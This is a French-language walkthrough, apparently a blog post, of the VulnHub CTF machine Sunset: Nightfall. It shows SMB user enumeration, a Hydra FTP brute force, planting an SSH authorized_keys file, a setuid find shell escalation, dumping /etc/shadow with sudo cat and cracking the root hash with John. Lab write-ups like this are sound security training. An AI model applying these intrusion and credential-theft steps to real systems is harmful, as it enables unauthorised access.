---
title: "Solution du CTF Sunset: Nightfall de VulnHub"
tags: [VulnHub, CTF]
---

[Sunset: Nightfall](https://vulnhub.com/entry/sunset-nightfall,355/) est un CTF qui a été publié sur *VulnHub* en aout 2019. Il est plutôt simple, mais j'ai été bloqué par des outils qui ne voulaient pas fonctionner sans raison claire.

Il y a pas mal de services exposés et je me dis que je vais récupérer pas mal de données.

```
Nmap scan report for 192.168.56.155
Host is up (0.00016s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         pyftpdlib 1.5.5
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
```

## camarchepaschezmoi.com

Mais après 20/30 minutes à tourner sans rien trouver, force est de constater que quelque chose n'allait pas.

Sur ma machine toutes les énumérations SMB (`Nmap`, `enum4linux`, `Impacket`, etc) échouaient à me donner une liste d'utilisateurs.

Finalement j'ai booté Kali Linux sur le même réseau virtuel et `enum4linux` a pu me trouver des comptes utilisateurs. Sans doute une histoire de pare-feu.

```
 =================( Users on 192.168.56.155 via RID cycling (RIDS: 500-550,1000-1050) )=================
[I] Found new SID:
S-1-22-1

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[+] Enumerating users using SID S-1-22-1 and logon username '', password '' 
S-1-22-1-1000 Unix User\nightfall (Local User) 
S-1-22-1-1001 Unix User\matt (Local User)
```

On peut alors procéder à une attaque par force brute. L'option `-u` de `THC Hydra` itère sur les mots de passe PUIS les utilisateurs. Dans le cas contraire ça prend un utilisateur, teste tous les mots de passe puis passe à l'utilisateur suivant, ce qui est rarement ce que l'on souhaite (surtout si la wordlist est triée par popularité par exemple).

```console
$ hydra -u -L users.txt -P .wordlists/rockyou.txt -e nsr ftp://192.168.56.155
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-03 20:30:40
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688768 login tries (l:2/p:14344384), ~1793048 tries per task
[DATA] attacking ftp://192.168.56.155:21/
[STATUS] 304.00 tries/min, 304 tries in 00:01h, 28688464 to do in 1572:50h, 16 active
[21][ftp] host: 192.168.56.155   login: matt   password: cheese
```

On peut alors se connecter sur le serveur FTP avec les identifiants et on se retrouve dans le dossier personnel de `matt`.

Là on peut placer dans le dossier `.ssh` un fichier `authorized_keys` qui nous ouvrira les portes du SSH.

## +s

Je m'attaque alors à l'autre utilisateur :

```console
matt@nightfall:/var$ find / -user nightfall -ls 2> /dev/null 
   136320      4 drwxr-xr-x   4 nightfall nightfall     4096 Aug 28  2019 /home/nightfall
   136338      4 -rw-------   1 nightfall nightfall      337 Aug 17  2019 /home/nightfall/.mysql_history
   136342      4 drwxr-xr-x   3 nightfall nightfall     4096 Aug 17  2019 /home/nightfall/.local
   136343      4 drwx------   3 nightfall nightfall     4096 Aug 17  2019 /home/nightfall/.local/share
   142163      4 drwx------   3 nightfall nightfall     4096 Aug 28  2019 /home/nightfall/.gnupg
   136321      4 -rw-r--r--   1 nightfall nightfall     3526 Aug 17  2019 /home/nightfall/.bashrc
   136322      4 -rw-r--r--   1 nightfall nightfall      807 Aug 17  2019 /home/nightfall/.profile
   136323      4 -rw-r--r--   1 nightfall nightfall      220 Aug 17  2019 /home/nightfall/.bash_logout
   141111      4 -rw-------   1 nightfall nightfall       33 Aug 28  2019 /home/nightfall/user.txt
   136333      0 -rw-------   1 nightfall nightfall        0 Aug 28  2019 /home/nightfall/.bash_history
   136358      4 drwxr-xr-x   2 nightfall nightfall     4096 Aug 28  2019 /scripts
   136345    312 -rwsr-sr-x   1 nightfall nightfall   315904 Aug 28  2019 /scripts/find
```

Il y a une copie de `find` avec le bit setuid. Avec le shell obtenu je peux recopier le `authorized_keys` précédent pour l'appliquer à `nightfall`.

```console
matt@nightfall:/var$ /scripts/find /etc/motd -exec /bin/sh -p \;
$ id
uid=1001(matt) gid=1001(matt) euid=1000(nightfall) egid=1000(nightfall) groups=1000(nightfall),1001(matt)
$ cd /home/nightfall
$ ls
user.txt
$ cat user.txt
97fb7140ca325ed96f67be3c9e30083d
$ mkdir .ssh        
$ cp /home/matt/.ssh/authorized_keys .ssh/authorized_keys
```

Je rouvre une connexion SSH pour constater qu'il peut utiliser `cat` en tant que root. Les scénarios semblent limités alors je dumpe `/etc/shadow`.

```console
nightfall@nightfall:~$ sudo -l
Matching Defaults entries for nightfall on nightfall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nightfall may run the following commands on nightfall:
    (root) NOPASSWD: /usr/bin/cat
nightfall@nightfall:~$ sudo /usr/bin/cat /etc/shadow
root:$6$JNHsN5GY.jc9CiTg$MjYL9NyNc4GcYS2zNO6PzQNHY2BE/YODBUuqsrpIlpS9LK3xQ6coZs6lonzURBJUDjCRegMHSF5JwCMG1az8k.:18134:0:99999:7:::
--- snip ---
```

Le mot de passe tombe rapidement.

```console
$ john --wordlist=wordlists/rockyou.txt /tmp/hashes.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
miguel2          (root)     
1g 0:00:00:20 DONE (2023-04-03 20:51) 0.04980g/s 1440p/s 1440c/s 1440C/s smile4..chrish
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Et c'en est fini de *Nightfall*.

```console
nightfall@nightfall:~$ su
Password: 
root@nightfall:/home/nightfall# cd /root
root@nightfall:~# ls
root_super_secret_flag.txt
root@nightfall:~# cat root_super_secret_flag.txt
Congratulations! Please contact me via twitter and give me some feedback! @whitecr0w1
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
.................................................................................................................................................................................................................
................................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...................................................................................
..............................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.................................................................................
............................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...............................................................................
..........................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.............................................................................
........................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...........................................................................
......................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.........................................................................
....................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.......................................................................
...................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@......................................................................
..................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.....................................................................
.................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@....................................................................
................................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...................................................................
................................................................&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&...................................................................
~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~
Thank you for playing! - Felipe Winsnes (whitecr0wz)                                 flag{9a5b21fc6719fe33004d66b703d70a39}
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```
